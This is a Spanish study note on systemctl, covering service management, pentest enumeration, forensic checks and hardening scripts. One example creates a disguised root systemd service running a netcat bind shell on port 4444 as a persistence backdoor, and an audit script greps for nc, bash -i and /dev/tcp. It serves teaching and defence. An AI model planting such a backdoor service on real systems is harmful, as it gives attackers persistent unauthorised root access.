---
Tema: "[[apuntes/herramientas/herramientas|herramientas]]"
---
# ‚öôÔ∏è Systemctl: Control de Servicios en Linux

> [!info] Herramienta fundamental de administraci√≥n
> **Systemctl** es la utilidad principal para controlar **systemd**, el sistema de inicializaci√≥n y gestor de servicios en distribuciones modernas de Linux. Es esencial para administrar servicios, procesos y el estado del sistema, tanto para tareas defensivas como ofensivas en ciberseguridad.

---

## üìã Tabla de Contenidos
- [Introducci√≥n](#introducci√≥n)
- [Sintaxis B√°sica](#sintaxis-b√°sica)
- [Gesti√≥n de Servicios](#gesti√≥n-de-servicios)
- [Estados y An√°lisis](#estados-y-an√°lisis)
- [Casos de Uso en Ciberseguridad](#casos-de-uso-en-ciberseguridad)
- [Ejemplos Pr√°cticos](#ejemplos-pr√°cticos)
- [Tips y Buenas Pr√°cticas](#tips-y-buenas-pr√°cticas)

---

## üìù Introducci√≥n

### ¬øQu√© es Systemctl?

Systemctl es la interfaz de l√≠nea de comandos para interactuar con **systemd**, el sistema de inicializaci√≥n usado por la mayor√≠a de distribuciones Linux modernas (Ubuntu 16.04+, CentOS 7+, Fedora, Debian 8+, etc.). Reemplaza comandos tradicionales como `service` y `chkconfig`.

### ¬øPara qu√© sirve?

- **Gesti√≥n de servicios**: Iniciar, detener, reiniciar y habilitar servicios
- **Monitoreo del sistema**: Ver estado de servicios y recursos
- **Control de arranque**: Configurar qu√© servicios inician autom√°ticamente
- **An√°lisis de logs**: Acceder a logs centralizados con journalctl
- **Gesti√≥n de targets**: Controlar el nivel de ejecuci√≥n del sistema

### Contextos de uso en ciberseguridad

```mermaid
graph TD
    A[Systemctl en Ciberseguridad] --> B[Administraci√≥n Defensiva]
    A --> C[Post-Explotaci√≥n]
    A --> D[An√°lisis Forense]
    A --> E[Persistencia]
    
    B --> B1[Hardening de servicios]
    B --> B2[Monitoreo de estado]
    
    C --> C1[Enumeraci√≥n de servicios]
    C --> C2[Elevaci√≥n de privilegios]
    
    D --> D1[An√°lisis de servicios comprometidos]
    D --> D2[Timeline de eventos]
    
    E --> E1[Creaci√≥n de servicios maliciosos]
    E --> E2[Modificaci√≥n de servicios existentes]
```

---

## üñ•Ô∏è Sintaxis B√°sica

### Formato general

```bash
systemctl [COMMAND] [OPTIONS] [UNIT]
```

### Comandos fundamentales

```bash
# Gesti√≥n b√°sica de servicios
systemctl start [servicio]      # Iniciar servicio
systemctl stop [servicio]       # Detener servicio
systemctl restart [servicio]    # Reiniciar servicio
systemctl reload [servicio]     # Recargar configuraci√≥n
systemctl status [servicio]     # Ver estado del servicio

# Configuraci√≥n de arranque
systemctl enable [servicio]     # Habilitar en arranque
systemctl disable [servicio]    # Deshabilitar en arranque
systemctl mask [servicio]       # Bloquear servicio completamente
systemctl unmask [servicio]     # Desbloquear servicio
```

> [!example] Comando b√°sico m√°s usado
> ```bash
> systemctl status ssh
> ```
> Muestra el estado completo del servicio SSH, incluyendo si est√° activo, habilitado, y las √∫ltimas l√≠neas de log.

---

## ‚öôÔ∏è Gesti√≥n de Servicios

### Estados de servicios

| Estado | Descripci√≥n | Significado |
|--------|-------------|-------------|
| **active (running)** | Servicio activo y en ejecuci√≥n | ‚úÖ Funcionando normalmente |
| **active (exited)** | Servicio completado exitosamente | ‚úÖ Tarea completada |
| **active (waiting)** | Servicio activo pero esperando evento | ‚è≥ En espera |
| **inactive (dead)** | Servicio detenido | ‚ùå No est√° ejecut√°ndose |
| **failed** | Servicio fall√≥ al iniciar | ‚ùå Error en la ejecuci√≥n |
| **activating** | Servicio inici√°ndose | ‚è≥ En proceso de inicio |
| **deactivating** | Servicio deteni√©ndose | ‚è≥ En proceso de parada |

### Comandos de gesti√≥n avanzada

```bash
# Listar servicios
systemctl list-units --type=service                # Todos los servicios
systemctl list-units --type=service --state=active # Solo servicios activos
systemctl list-units --type=service --state=failed # Solo servicios fallidos

# Informaci√≥n detallada
systemctl show [servicio]           # Propiedades completas del servicio
systemctl cat [servicio]           # Ver archivo de configuraci√≥n
systemctl list-dependencies [servicio] # Ver dependencias

# Control de sistema
systemctl reboot                   # Reiniciar sistema
systemctl poweroff                 # Apagar sistema
systemctl suspend                  # Suspender sistema
systemctl hibernate               # Hibernar sistema
```

### Targets (equivalente a runlevels)

```bash
# Ver target actual
systemctl get-default

# Cambiar target por defecto
systemctl set-default multi-user.target

# Targets comunes
systemctl isolate rescue.target        # Modo rescue
systemctl isolate multi-user.target    # Modo multiusuario sin GUI
systemctl isolate graphical.target     # Modo gr√°fico completo
```

---

## üîê Casos de Uso en Ciberseguridad

### 1. Enumeraci√≥n post-explotaci√≥n

Despu√©s de comprometer un sistema, systemctl es crucial para entender qu√© servicios est√°n ejecut√°ndose y identificar vectores de escalada.

### 2. Persistencia

Los atacantes pueden crear servicios maliciosos o modificar existentes para mantener acceso persistente.

### 3. An√°lisis forense

Los administradores usan systemctl para investigar compromisos y entender qu√© servicios fueron afectados.

### 4. Hardening defensivo

Para asegurar sistemas deshabilitando servicios innecesarios y monitoreando estados.

---

## üíª Ejemplos Pr√°cticos

### Ejemplo 1: Enumeraci√≥n completa del sistema para pentesting

```bash
# Ver todos los servicios y su estado
systemctl list-units --type=service --all

# Identificar servicios en ejecuci√≥n que podr√≠an ser vulnerables
systemctl list-units --type=service --state=active | grep -E "(ssh|http|ftp|mysql|apache|nginx)"

# Ver servicios habilitados para arranque (persistencia)
systemctl list-unit-files --type=service --state=enabled

# Buscar servicios personalizados o sospechosos
systemctl list-units --type=service | grep -v -E "(systemd|dbus|network|cron|log)"
```

> [!info] Explicaci√≥n
> Este conjunto de comandos es ideal para la fase de enumeraci√≥n en pentesting:
> 1. **Primer comando**: Lista todos los servicios del sistema con su estado actual
> 2. **Segundo comando**: Filtra servicios comunes que suelen tener vulnerabilidades conocidas
> 3. **Tercer comando**: Identifica qu√© servicios se inician autom√°ticamente (importante para persistencia)
> 4. **Cuarto comando**: Busca servicios no est√°ndar que podr√≠an ser backdoors o aplicaciones personalizadas
> 
> **Informaci√≥n valiosa que obtienes:**
> - Servicios vulnerables a explotar
> - Aplicaciones web en ejecuci√≥n
> - Servicios de bases de datos
> - Posibles backdoors o servicios customizados

### Ejemplo 2: Creaci√≥n de persistencia mediante servicio malicioso

```bash
# Crear archivo de servicio malicioso
sudo tee /etc/systemd/system/system-update.service > /dev/null <<EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'while true; do nc -l -p 4444 -e /bin/bash; sleep 5; done'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Recargar systemd para reconocer el nuevo servicio
sudo systemctl daemon-reload

# Habilitar servicio para arranque autom√°tico
sudo systemctl enable system-update.service

# Iniciar servicio inmediatamente
sudo systemctl start system-update.service

# Verificar que est√° funcionando
systemctl status system-update.service
```

> [!warning] Solo para entornos controlados
> Este ejemplo muestra c√≥mo un atacante podr√≠a establecer persistencia:
> 1. **Archivo de servicio**: Se crea un servicio que parece leg√≠timo ("system-update")
> 2. **Comando malicioso**: Ejecuta un backdoor de netcat que se reinicia autom√°ticamente
> 3. **Persistencia**: El servicio se inicia autom√°ticamente en cada arranque
> 4. **Resilencia**: Si el backdoor se cierra, se reinicia autom√°ticamente cada 10 segundos
> 
> **Detecci√≥n:**
> - Servicios no reconocidos en la lista
> - Conexiones de red inusuales
> - Procesos netcat/bash an√≥malos

### Ejemplo 3: An√°lisis forense y hardening defensivo

```bash
# Identificar servicios que fallaron recientemente
systemctl --failed

# Ver servicios que han sido modificados recientemente
find /etc/systemd/system/ -name "*.service" -mtime -7 -exec ls -la {} \;

# Analizar servicios con alta carga de CPU o memoria
systemctl status | head -20

# Verificar integridad de servicios cr√≠ticos
systemctl cat ssh.service | grep -E "(ExecStart|User|Type)"
systemctl cat apache2.service | grep -E "(ExecStart|User|Type)"

# Deshabilitar servicios innecesarios para hardening
sudo systemctl disable telnet.service 2>/dev/null || echo "telnet no est√° instalado"
sudo systemctl disable rsh.service 2>/dev/null || echo "rsh no est√° instalado"
sudo systemctl disable ftp.service 2>/dev/null || echo "ftp no est√° instalado"

# Ver timeline de eventos del sistema
journalctl --since "1 hour ago" | grep -E "(start|stop|fail|error)"
```

> [!info] Explicaci√≥n
> Este ejemplo combina an√°lisis forense con hardening:
> 1. **Servicios fallidos**: Identifica problemas que podr√≠an indicar compromiso o mal funcionamiento
> 2. **Archivos modificados**: Busca servicios que fueron alterados recientemente (posible indicador de compromiso)
> 3. **An√°lisis de rendimiento**: Identifica servicios que consumen recursos anormalmente
> 4. **Verificaci√≥n de integridad**: Examina configuraci√≥n de servicios cr√≠ticos
> 5. **Hardening**: Deshabilita servicios inseguros comunes
> 6. **Timeline de eventos**: Construye una l√≠nea temporal de actividad del sistema
> 
> **Casos de uso:**
> - Investigaci√≥n post-incidente
> - Auditor√≠a de seguridad
> - Hardening preventivo
> - Monitoreo proactivo

---

## üîç An√°lisis Avanzado con Systemctl

### Script de an√°lisis automatizado

```bash
#!/bin/bash
# systemctl_security_audit.sh

echo "=== AUDITOR√çA DE SEGURIDAD DE SERVICIOS ==="
echo

# 1. Resumen general del sistema
echo "[1] RESUMEN DEL SISTEMA:"
echo "Target actual: $(systemctl get-default)"
echo "Servicios activos: $(systemctl list-units --type=service --state=active --no-pager | wc -l)"
echo "Servicios fallidos: $(systemctl --failed --no-pager | wc -l)"
echo

# 2. Servicios cr√≠ticos para seguridad
echo "[2] ESTADO DE SERVICIOS CR√çTICOS:"
critical_services=("ssh" "apache2" "nginx" "mysql" "postgresql" "firewalld" "ufw")
for service in "${critical_services[@]}"; do
    status=$(systemctl is-active $service 2>/dev/null || echo "no-instalado")
    enabled=$(systemctl is-enabled $service 2>/dev/null || echo "n/a")
    echo "$service: $status / $enabled"
done
echo

# 3. Servicios sospechosos o no est√°ndar
echo "[3] SERVICIOS POTENCIALMENTE SOSPECHOSOS:"
systemctl list-units --type=service --state=active --no-pager | 
awk 'NR>1 {print $1}' | 
grep -v -E "(systemd|dbus|network|cron|log|getty|ssh|apache|nginx|mysql)" | 
head -10
echo

# 4. Servicios con ExecStart sospechoso
echo "[4] SERVICIOS CON COMANDOS SOSPECHOSOS:"
find /etc/systemd/system/ -name "*.service" -exec grep -l -E "(nc|netcat|bash -i|/tmp/|/dev/tcp)" {} \; 2>/dev/null
echo

# 5. Servicios modificados recientemente
echo "[5] SERVICIOS MODIFICADOS EN LA √öLTIMA SEMANA:"
find /etc/systemd/system/ -name "*.service" -mtime -7 -exec ls -la {} \; 2>/dev/null
echo

echo "=== FIN DE AUDITOR√çA ==="
```

### Integraci√≥n con herramientas de monitoreo

```bash
# Combinar systemctl con netstat para an√°lisis de red
for service in $(systemctl list-units --type=service --state=active --no-pager | awk 'NR>1 {print $1}' | cut -d'.' -f1); do
    pid=$(systemctl show -p MainPID --value $service.service 2>/dev/null)
    if [ "$pid" != "0" ] && [ "$pid" != "" ]; then
        echo "=== $service (PID: $pid) ==="
        netstat -tulpn | grep $pid
    fi
done

# Monitorear cambios en servicios en tiempo real
watch -n 5 'systemctl list-units --type=service --state=failed --no-pager'

# Alertas autom√°ticas para servicios cr√≠ticos
#!/bin/bash
# service_monitor.sh
critical_services=("ssh" "apache2" "mysql")
for service in "${critical_services[@]}"; do
    if ! systemctl is-active --quiet $service; then
        echo "ALERTA: $service est√° inactivo" | mail -s "Servicio cr√≠tico ca√≠do" admin@empresa.com
    fi
done
```

---

## üí° Tips y Buenas Pr√°cticas

### Optimizaci√≥n y eficiencia

```mermaid
graph TD
    A[Buenas Pr√°cticas Systemctl] --> B[Seguridad]
    A --> C[Eficiencia]
    A --> D[Monitoreo]
    
    B --> B1[Principio de menor privilegio]
    B --> B2[Auditor√≠a regular de servicios]
    B --> B3[Deshabilitar servicios innecesarios]
    
    C --> C1[Usar --no-pager para scripts]
    C --> C2[Filtrar con grep/awk]
    C --> C3[Automatizar verificaciones]
    
    D --> D1[Logs centralizados con journalctl]
    D --> D2[Alertas proactivas]
    D --> D3[M√©tricas de rendimiento]
```

> [!tip] Mejores pr√°cticas para administradores
> **Seguridad:**
> - Revisar regularmente servicios habilitados con `systemctl list-unit-files --state=enabled`
> - Auditar servicios personalizados en `/etc/systemd/system/`
> - Usar `systemctl mask` para servicios que nunca deben ejecutarse
> - Monitorear logs con `journalctl` para detectar anomal√≠as
> 
> **Eficiencia:**
> - Usar `--no-pager` en scripts para evitar interacci√≥n
> - Combinar con `grep`, `awk` y `sort` para filtrar resultados
> - Aprovechar `systemctl show` para obtener propiedades espec√≠ficas
> - Usar `watch` para monitoreo en tiempo real

### Hardening de servicios

```bash
# Lista de verificaci√≥n de hardening
echo "=== CHECKLIST DE HARDENING ==="

# Servicios innecesarios comunes a deshabilitar
unnecessary_services=("telnet" "rsh" "rlogin" "ftp" "tftp" "finger" "talk")
echo "[1] Verificando servicios innecesarios:"
for service in "${unnecessary_services[@]}"; do
    if systemctl is-enabled $service &>/dev/null; then
        echo "‚ö†Ô∏è  $service est√° habilitado - considerar deshabilitar"
    else
        echo "‚úÖ $service no est√° habilitado"
    fi
done

# Verificar servicios ejecut√°ndose como root
echo -e "\n[2] Servicios ejecut√°ndose como root:"
systemctl show --property=User --all | grep "User=$" | wc -l

# Servicios con restart autom√°tico
echo -e "\n[3] Servicios con restart autom√°tico:"
find /etc/systemd/system/ -name "*.service" -exec grep -l "Restart=" {} \; | wc -l
```

### Comandos de referencia r√°pida

```bash
# Los comandos m√°s importantes para ciberseguridad
systemctl list-units --type=service              # Ver todos los servicios
systemctl list-units --type=service --state=active # Solo activos
systemctl list-unit-files --state=enabled        # Habilitados para arranque
systemctl --failed                              # Servicios fallidos
systemctl status [servicio]                     # Estado detallado
systemctl cat [servicio]                        # Ver configuraci√≥n

# An√°lisis r√°pido de seguridad
systemctl list-units --type=service | grep -v systemd # Servicios no-systemd
find /etc/systemd/system/ -name "*.service" -mtime -1  # Modificados hoy
journalctl -u [servicio] --since "1 hour ago"         # Logs recientes
```

### Errores comunes y soluciones

| Error | Causa | Soluci√≥n |
|-------|-------|----------|
| `Failed to start` | Configuraci√≥n incorrecta | `systemctl status [servicio]` y revisar logs |
| `Unit not found` | Servicio no existe | Verificar nombre con `systemctl list-units` |
| `Permission denied` | Sin privilegios | Usar `sudo` para operaciones administrativas |
| `Job is running` | Operaci√≥n en progreso | Esperar o usar `systemctl kill [servicio]` |
| `Masked unit` | Servicio bloqueado | `systemctl unmask [servicio]` primero |

---

## üìä Integraci√≥n con el ecosistema de herramientas

### Combinaci√≥n con otras herramientas de ciberseguridad

```bash
# Con nmap para verificar servicios
nmap -sV localhost | grep open
systemctl list-units --type=service --state=active | grep -E "(http|ssh|ftp)"

# Con ps para correlacionar procesos
systemctl status apache2 | grep "Main PID"
ps aux | grep apache

# Con netstat para verificar puertos
systemctl list-units --type=service --state=active | while read service _; do
    pid=$(systemctl show -p MainPID --value $service 2>/dev/null)
    [ "$pid" != "0" ] && netstat -tulpn | grep $pid
done

# Con find para auditar archivos
find /etc/systemd/system/ -name "*.service" -exec systemctl cat {} \; | grep -E "(ExecStart|User)"
```

---

## üîó Recursos adicionales

- Manual oficial: `man systemctl`
- Documentaci√≥n de systemd: `man systemd.service`
- Logs del sistema: `journalctl --help`
- Targets del sistema: `man systemd.target`

> [!success] Puntos clave para recordar
> - **Systemctl** es fundamental para la administraci√≥n moderna de Linux
> - **Enumerar servicios** es cr√≠tico en post-explotaci√≥n
> - **Los servicios personalizados** pueden ser vectores de persistencia
> - **La auditor√≠a regular** ayuda a detectar compromisos
> - **Combinar con otras herramientas** proporciona an√°lisis completo
> - **El hardening de servicios** es esencial para la seguridad defensiva